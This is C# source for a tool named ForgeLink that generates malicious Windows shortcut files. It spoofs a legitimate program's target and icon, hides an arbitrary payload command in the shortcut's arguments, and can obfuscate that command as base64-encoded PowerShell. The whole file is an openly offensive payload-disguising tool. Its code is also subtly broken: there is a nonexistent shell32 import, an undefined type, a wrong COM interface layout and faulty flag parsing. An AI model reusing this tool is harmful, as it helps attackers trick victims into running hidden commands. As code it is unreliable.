using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ForgeLink
{
    class Program
    {
        // WinAPI imports for LNK creation
        [DllImport("ole32.dll")]
        static extern int CreateBindCtx(uint reserved, out IBindCtx ppbc);

        [DllImport("shell32.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
        static extern IShellLinkW CreateShellLink();

        [ComImport]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IShellLinkW
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cch, out IntPtr pfd, uint fFlags);
            IntPtr GetIDList();
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cch);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cch);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cch);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            short GetHotKey();
            void SetHotKey(short wHotKey);
            uint GetShowCmd();
            void SetShowCmd(uint iShowCmd);
            uint GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath, int cch, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, uint dwReserved);
            void Resolve(IntPtr hwnd, uint fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        [ComImport]
        [Guid("0000010c-0000-0000-C000-000000000046")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IPersistFile
        {
            void GetClassID(out Guid pClassID);
            [PreserveSig]
            int IsDirty();
            void Load([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, uint dwMode);
            void Save([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, [MarshalAs(UnmanagedType.Bool)] bool fRemember);
            void SaveCompleted([MarshalAs(UnmanagedType.LPWStr)] string pszFileName);
            void GetCurFile([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFileName);
        }

        static void Main(string[] args)
        {
            if (args.Length < 4 || args[0] != "generate")
            {
                Console.WriteLine("Usage: ForgeLink.exe generate --target <path> --icon <icon_path,resource_id> --payload <command> --output <lnk_file> [--obfuscate]");
                return;
            }

            string target = "";
            string icon = "";
            string payload = "";
            string output = "evil.lnk";
            bool obfuscate = false;

            for (int i = 1; i < args.Length; i += 2)
            {
                switch (args[i])
                {
                    case "--target": target = args[i + 1]; break;
                    case "--icon": icon = args[i + 1]; break;
                    case "--payload": payload = args[i + 1]; break;
                    case "--output": output = args[i + 1]; break;
                    case "--obfuscate": obfuscate = true; break;
                }
            }

            if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(payload))
            {
                Console.WriteLine("Missing --target or --payload");
                return;
            }

            try
            {
                CreateMaliciousLnk(target, icon, payload, output, obfuscate);
                Console.WriteLine($"[+] Malicious LNK created: {output}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
        }

        static void CreateMaliciousLnk(string targetPath, string iconPath, string payload, string outputPath, bool obfuscate)
        {
            var sl = CreateShellLink();

            // Set target (legit exe to spoof)
            sl.SetPath(targetPath);

            // Set arguments (hidden payload)
            string args = obfuscate ? ObfuscateArgs(payload) : payload;
            sl.SetArguments(args);

            // Set icon (spoof from legit file)
            if (!string.IsNullOrEmpty(iconPath))
            {
                string[] parts = iconPath.Split(',');
                string iconFile = parts[0];
                int iconIndex = parts.Length > 1 ? int.Parse(parts[1]) : 0;
                sl.SetIconLocation(iconFile, iconIndex);
            }

            // Set working dir to temp (hides payload)
            sl.SetWorkingDirectory(Path.GetTempPath());

            // Save as .lnk
            var pf = (IPersistFile)sl;
            pf.Save(outputPath, true);

            Marshal.ReleaseComObject(sl);
            Marshal.ReleaseComObject(pf);
        }

        static string ObfuscateArgs(string payload)
        {
            // Simple obfuscation - base64 + powershell encoded
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(payload));
            return $"-EncodedCommand {b64}";
        }
    }
}